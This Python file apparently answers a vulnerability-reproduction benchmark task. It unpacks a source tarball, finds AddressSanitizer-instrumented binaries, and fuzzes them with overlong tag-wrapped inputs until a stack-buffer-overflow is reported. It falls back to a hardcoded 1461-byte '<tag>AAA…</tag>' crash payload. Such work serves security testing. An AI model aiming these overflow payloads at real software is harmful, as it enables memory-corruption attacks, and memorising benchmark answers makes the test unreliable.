import os
import tarfile
import tempfile
import subprocess
import random
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = self._prepare_root(src_path)
        asan_bins = self._find_asan_binaries(root)
        if asan_bins:
            poc = self._search_poc(asan_bins)
            if poc is not None:
                return poc
        return self._fallback_poc()

    def _prepare_root(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path
        tmpdir = tempfile.mkdtemp(prefix="src-")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
            return tmpdir
        except tarfile.ReadError:
            # Not a tarball; just use directory containing the file if possible
            return os.path.dirname(os.path.abspath(src_path)) or tmpdir

    def _find_asan_binaries(self, root: str):
        candidates = []
        for dirpath, _, filenames in os.walk(root):
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                # must be executable
                if not (st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)):
                    continue
                # size bounds
                if st.st_size < 4096 or st.st_size > 50 * 1024 * 1024:
                    continue
                try:
                    with open(path, "rb") as f:
                        head = f.read(4)
                        if head != b"\x7fELF":
                            continue
                        data = f.read()
                except OSError:
                    continue
                if b"AddressSanitizer" in data or b"__asan_init" in data:
                    score = self._score_binary_name(name)
                    candidates.append((score, path))
        candidates.sort(reverse=True)
        return [p for _, p in candidates]

    def _score_binary_name(self, name: str) -> int:
        n = name.lower()
        score = 0
        if "fuzz" in n:
            score += 20
        if "target" in n:
            score += 10
        if "vuln" in n:
            score += 8
        if "asan" in n:
            score += 5
        if "test" in n:
            score += 4
        if "bin" in n:
            score += 2
        # prefer shorter names slightly
        score += max(0, 20 - len(n))
        return score

    def _candidate_inputs(self):
        max_len = 1800
        baseA = b"A" * (max_len - 100)
        candidates = []

        def add(inp: bytes):
            if inp:
                candidates.append(inp)

        # Simple overlong inputs
        add(b"A" * max_len)
        for size in range(256, max_len + 1, 256):
            add(b"A" * size)

        # Tag-based patterns
        add(b"<tag>" + baseA + b"</tag>")
        add(b"<tag" + baseA + b">")
        add(b"<" + baseA + b">")
        add(b"\\tag{" + baseA + b"}")
        add(b"[tag]" + baseA + b"[/tag]")
        add(b"{tag:" + baseA + b"}")
        add(b"<TAG>" + baseA + b"</TAG>")
        add(b"#tag " + baseA)
        add(b"@tag " + baseA)
        add(b"<tag attr=\"" + baseA + b"\">")
        add(b"<tag attr='" + baseA + b"'>")
        add(b"<tag><inner>" + baseA + b"</inner></tag>")

        for n in [10, 30, 50, 80]:
            add((b"<tag>" * n) + baseA[: max_len // 2])

        # Mixed text with repeated tags
        header = b"HEADER\n" + b"tag parser test\n"
        add(header + (b"<tag>" + b"A" * 50) * 20 + baseA)

        # Randomized patterns with 'tag'
        random.seed(0)
        alphabet = b"abcdefghijklmnopqrstuvwxyz<>/\\#@{}[]()= \"'\n\t"
        tag_tokens = [b"tag", b"<tag>", b"\\tag{", b"[tag]", b"#tag "]
        for _ in range(20):
            length = random.randint(100, max_len)
            s = bytearray()
            while len(s) < length:
                if random.random() < 0.15:
                    token = random.choice(tag_tokens)
                    s.extend(token)
                else:
                    s.append(alphabet[random.randint(0, len(alphabet) - 1)])
            candidates.append(bytes(s[:length]))

        # Deduplicate while preserving order
        seen = set()
        uniq = []
        for c in candidates:
            if c not in seen:
                seen.add(c)
                uniq.append(c)
        return uniq

    def _triggers_overflow(self, bin_path: str, data: bytes) -> bool:
        env = os.environ.copy()
        # Encourage ASan to abort on errors quickly
        asan_opts = env.get("ASAN_OPTIONS", "")
        extra_opts = "detect_leaks=0:halt_on_error=1:abort_on_error=1"
        env["ASAN_OPTIONS"] = extra_opts if not asan_opts else asan_opts + ":" + extra_opts
        try:
            proc = subprocess.run(
                [bin_path],
                input=data,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=1.0,
                env=env,
            )
        except (subprocess.TimeoutExpired, OSError):
            return False
        if proc.returncode == 0:
            return False
        output = proc.stdout + proc.stderr
        if b"ERROR: AddressSanitizer" in output and b"stack-buffer-overflow" in output:
            return True
        return False

    def _search_poc(self, binaries):
        inputs = self._candidate_inputs()
        max_runs_per_bin = 80
        for bin_path in binaries:
            runs = 0
            for data in inputs:
                if runs >= max_runs_per_bin:
                    break
                runs += 1
                if self._triggers_overflow(bin_path, data):
                    return data
        return None

    def _fallback_poc(self) -> bytes:
        # Construct a 1461-byte payload: long tag with large content
        target_len = 1461
        prefix = b"<tag>"
        suffix = b"</tag>"
        fill_len = max(0, target_len - len(prefix) - len(suffix))
        fill = b"A" * fill_len
        poc = prefix + fill + suffix
        # Ensure exact length
        if len(poc) > target_len:
            poc = poc[:target_len]
        elif len(poc) < target_len:
            poc += b"A" * (target_len - len(poc))
        return poc